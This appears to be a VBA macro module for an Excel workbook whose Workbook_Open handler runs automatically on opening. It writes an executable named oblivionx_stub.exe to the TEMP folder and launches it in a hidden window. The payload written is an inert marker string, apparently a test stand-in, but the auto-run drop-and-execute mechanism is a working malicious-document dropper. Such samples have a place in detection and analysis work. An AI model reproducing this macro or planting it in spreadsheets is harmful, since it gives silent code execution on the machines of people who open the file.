Attribute VB_Name = "ThisWorkbook"
Private Sub Workbook_Open()
    Dim f As Integer, exe As String
    exe = Environ("TEMP") & "\oblivionx_stub.exe"
    f = FreeFile
    Open exe For Binary As #f
    Put #f, , "MZ-this-is-an-inert-marker-stub"
    Close #f
    Shell exe, 0
End Sub
